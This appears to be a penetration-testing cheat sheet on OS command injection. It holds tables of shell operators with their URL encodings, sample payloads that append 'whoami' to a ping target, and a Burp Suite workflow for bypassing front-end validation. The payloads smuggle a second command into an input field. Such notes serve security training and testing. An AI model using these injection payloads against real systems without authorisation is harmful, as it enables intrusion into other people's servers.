# Detection

Command Injection Detection
ping -c 1 OUR_INPUT

Command Injection Methods

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command                           |
|--------------------|---------------------|-----------------------|--------------------------------------------|
| Semicolon          | ;                   | %3b                   | Both                                       |
| New Line           | \n                  | %0a                   | Both                                       |
| Background         | &                   | %26                   | Both (second output generally shown first) |
| Pipe               | \|                  | %7c                   | Both (only second output is shown)         |
| AND                | &&                  | %26%26                | Both (only if first succeeds)              |
| OR                 | \|\|                | %7c%7c                | Second (only if first fails)               |
| Sub-Shell          | ``                  | %60%60                | Both (Linux-only)                          |
| Sub-Shell          | $()                 | %24%28%29             | Both (Linux-only)                          |

# Injecting Commands

Injecting Our Command
ping -c 1 127.0.0.1; whoami

Bypassing Front-End Validation
Burp Suite :
Send a standard request with IP 127.0.0.1
[CTRL + R] send the intercepted HTTP request to repeater
Inject our post parameter : 127.0.0.1; whoami
[CTRL + U] to URL encode the payload

ip=127.0.0.1%3bwhoami

# Other Injection Operators

AND Operator
ping -c 1 127.0.0.1 && whoami

OR Operator
ping -c 1 127.0.0.1 || whoami

--> executes the second command if the first command fails to execute
ping -c 1 || whoami

| Injection Type                          | Operators                           |
|-----------------------------------------|-------------------------------------|
| SQL Injection                           | ' , ; -- /* */                      |
| Command Injection                       | ; &&                                |
| LDAP Injection                          | * ( ) & \|                          |
| XPath Injection                         | ' or and not substring concat count |
| OS Command Injection                    | ; & \|                              |
| Code Injection                          | ' ; -- /* */ $() ${} #{} %{} ^      |
| Directory Traversal/File Path Traversal | ../ ..\\ %00                        |
| Object Injection                        | ; & \|                              |
| XQuery Injection                        | ' ; -- /* */                        |
| Shellcode Injection                     | \x \u %u %n                         |
| Header Injection                        | \n \r\n \t %0d %0a %09              |

